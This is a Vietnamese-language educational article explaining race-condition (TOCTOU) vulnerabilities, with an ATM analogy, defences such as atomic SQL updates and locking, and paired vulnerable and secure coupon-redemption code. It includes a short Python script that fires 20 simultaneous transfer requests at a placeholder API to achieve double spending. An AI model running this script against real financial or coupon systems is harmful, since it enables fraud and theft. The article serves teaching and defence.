# Race Conditions (TOCTOU)

> **CWE**: CWE-362 | **Phân loại**: Insecure Design

## Kiến thức Nền tảng
Hãy tưởng tượng bạn và một người bạn dùng chung một tài khoản ngân hàng chỉ có 1.000.000 đồng. Vào cùng một giây, cả hai người đứng ở hai cây ATM khác nhau và cùng nhấn lệnh rút 1.000.000 đồng. Cây ATM thứ nhất hỏi máy chủ: "Tài khoản này đủ tiền không?" - Máy chủ trả lời: "Có, đủ 1.000.000 đồng". Tuy nhiên, ngay trước khi máy chủ kịp trừ tiền ở cây ATM thứ nhất, cây ATM thứ hai cũng gửi câu hỏi tương tự và máy chủ vẫn trả lời: "Có, đủ 1.000.000 đồng" (vì số dư chưa bị trừ). Kết quả là cả hai cây ATM đều nhả tiền và bạn đã rút được 2.000.000 đồng từ tài khoản chỉ có 1.000.000 đồng. Hiện tượng tranh giành tài nguyên này được gọi là **Điều kiện tranh chấp (Race Condition)**.

Trong các hệ thống máy tính hiện đại, để phục vụ hàng ngàn người dùng cùng lúc, máy chủ phải xử lý nhiều yêu cầu song song (đa luồng - **multithreading**). Khi các yêu cầu này cùng đọc và ghi vào một cơ sở dữ liệu chung, nếu không được sắp xếp thứ tự cẩn thận, chúng sẽ đè lên nhau.

Trường hợp phổ biến nhất là lỗi **TOCTOU (Time-of-Check to Time-of-Use)**. Đây là quy trình hai bước: đầu tiên hệ thống kiểm tra điều kiện (Check), sau đó mới thực hiện hành động dựa trên kết quả đó (Use). Khoảng thời gian trống cực kỳ ngắn giữa hai bước này chính là **cửa sổ tranh chấp (race window)**. Kẻ tấn công sẽ tìm cách chen vào khoảng trống này để thực hiện hành động trước khi hệ thống kịp ghi nhận thay đổi.

Ví dụ quy trình chuyển tiền bình thường:

```python
# Normal bank transfer flow (single-threaded, safe)
def transfer(sender_id, receiver_id, amount):
    sender = get_account(sender_id)
    
    # CHECK: verify sufficient balance
    if sender.balance >= amount:
        # USE: deduct and credit
        sender.balance -= amount
        receiver = get_account(receiver_id)
        receiver.balance += amount
        save(sender)
        save(receiver)
        return "Transfer successful"
    
    return "Insufficient funds"
```

Trong môi trường đơn luồng, đoạn code trên hoạt động đúng. Nhưng khi hai request chuyển tiền được gửi đồng thời, cả hai đều đọc cùng một số dư ban đầu trước khi bất kỳ request nào cập nhật — dẫn đến "double spending".

## Mô tả lỗ hổng
Lỗ hổng Điều kiện tranh chấp (Race Condition) xảy ra khi tính chính xác của chương trình phụ thuộc vào thời gian hoặc thứ tự thực thi của các tiến trình song song. 

Kẻ tấn công khai thác lỗ hổng này bằng cách sử dụng các công cụ gửi hàng loạt yêu cầu giống hệt nhau lên máy chủ trong cùng một mili giây. Bằng cách làm ngập máy chủ như vậy, chúng cố tình tạo ra tình huống tranh chấp để vượt qua các bước kiểm tra logic của hệ thống. 

Mối nguy hiểm của lỗ hổng này là kẻ tấn công có thể thực hiện những hành động bất hợp pháp như rút tiền quá hạn mức (double spending), áp dụng một mã giảm giá nhiều lần để mua hàng miễn phí, bỏ phiếu lặp lại hoặc đăng ký nhiều tài khoản có cùng tên đăng nhập. Lỗi này cực kỳ khó phát hiện nếu chỉ kiểm thử theo cách thông thường từng bước một.

## Cơ chế tấn công
Attacker sử dụng công cụ gửi nhiều request đồng thời để khai thác race window:

```python
# Attack: sending concurrent requests to exploit race window
import asyncio
import aiohttp

async def exploit_double_spend(session, url, headers, payload):
    async with session.post(url, json=payload, headers=headers) as resp:
        return await resp.json()

async def main():
    url = "https://target.com/api/transfer"
    headers = {"Authorization": "Bearer <token>"}
    payload = {"to": "attacker_account", "amount": 1000}
    
    async with aiohttp.ClientSession() as session:
        # Send 20 identical requests simultaneously
        tasks = [exploit_double_spend(session, url, headers, payload) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        # Count successful transfers (should be 1, but may be more)
        success = sum(1 for r in results if r.get("status") == "success")
        print(f"Successful transfers: {success}")

asyncio.run(main())
```

Với Burp Suite, attacker có thể dùng tính năng **"Send group in parallel (last-byte sync)"** trong Repeater để đồng bộ hóa chính xác thời điểm gửi request, tối đa hóa khả năng trúng race window.

## Biện pháp phòng thủ
- **Tóm tắt**: Phòng chống Race Condition bằng cách sử dụng các thao tác cơ sở dữ liệu nguyên tử (atomic), cơ chế khóa (locking) ở cấp độ DB hoặc khóa phân tán (Redis).
- **Các bước chi tiết**:
  - **Database-level locking**: Sử dụng `SELECT ... FOR UPDATE` hoặc optimistic locking với version column để serialize các thao tác trên cùng một bản ghi.
  - **Atomic operations**: Dùng câu lệnh SQL nguyên tử thay vì đọc-rồi-ghi riêng biệt.
  - **Distributed locks**: Sử dụng Redis lock hoặc database advisory lock cho hệ thống phân tán.
  - **Idempotency keys**: Yêu cầu client gửi kèm unique key cho mỗi thao tác, server từ chối các key trùng lặp.

## Code Example
```python
# VULNERABLE: read-then-write without locking
def redeem_coupon(user_id, coupon_code):
    coupon = db.query("SELECT * FROM coupons WHERE code = %s", coupon_code)
    if coupon and not coupon.used:
        # Race window: another request can pass the check here
        db.execute("UPDATE coupons SET used = TRUE WHERE code = %s", coupon_code)
        db.execute("UPDATE users SET balance = balance + %s WHERE id = %s", coupon.value, user_id)
        return {"status": "success", "credited": coupon.value}
    return {"status": "error", "message": "Invalid or used coupon"}
```

```python
# SECURE: atomic operation with database-level protection
def redeem_coupon_safe(user_id, coupon_code):
    # Atomic update: only succeeds if coupon is not yet used
    result = db.execute(
        "UPDATE coupons SET used = TRUE, used_by = %s "
        "WHERE code = %s AND used = FALSE "
        "RETURNING value",
        user_id, coupon_code
    )
    
    if result.rowcount == 1:
        coupon_value = result.fetchone().value
        # Credit user within same transaction
        db.execute(
            "UPDATE users SET balance = balance + %s WHERE id = %s",
            coupon_value, user_id
        )
        db.commit()
        return {"status": "success", "credited": coupon_value}
    
    db.rollback()
    return {"status": "error", "message": "Invalid or already used coupon"}
```

## Xem thêm
- [Business Logic Vulnerabilities](../business-logic-vulnerabilities/) — Lỗ hổng logic nghiệp vụ, nơi Race Conditions thường được sử dụng để phá vỡ các giả định và quy trình nghiệp vụ như mua hàng hoặc thanh toán.

## Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/race-conditions
- OWASP: https://owasp.org/www-community/vulnerabilities/Race_Condition
- CWE: https://cwe.mitre.org/data/definitions/362.html

## Giải thích thuật ngữ
- **Multithreading (Đa luồng)**: Công nghệ cho phép một chương trình máy tính thực hiện đồng thời nhiều luồng công việc khác nhau để tối ưu hóa hiệu suất và tốc độ xử lý.
- **Concurrency (Xử lý đồng thời)**: Khả năng của hệ thống xử lý nhiều nhiệm vụ hoặc yêu cầu chồng chéo nhau về mặt thời gian, tạo cảm giác chúng đang chạy song song cùng lúc.
- **Shared Resource (Tài nguyên chia sẻ)**: Bất kỳ biến dữ liệu, tệp tin hoặc vùng bộ nhớ nào mà nhiều tiến trình hoặc luồng xử lý khác nhau đều có quyền truy cập và chỉnh sửa.
- **TOCTOU (Time-of-Check to Time-of-Use)**: Lớp lỗ hổng bảo mật liên quan đến thời gian, xuất hiện khi có sự chậm trễ giữa thời điểm kiểm tra tính hợp lệ của tài nguyên và thời điểm thực sự sử dụng tài nguyên đó.
- **Race Window (Cửa sổ tranh chấp)**: Khoảng thời gian nhỏ giữa lúc điều kiện được kiểm tra và lúc hành động được thực hiện, là cơ hội để kẻ tấn công chen vào sửa đổi dữ liệu.
- **Atomic Operations (Thao tác nguyên tử)**: Các thao tác xử lý dữ liệu được đảm bảo thực hiện một cách trọn vẹn và duy nhất, không thể bị gián đoạn hay xen ngang bởi bất kỳ luồng xử lý nào khác.
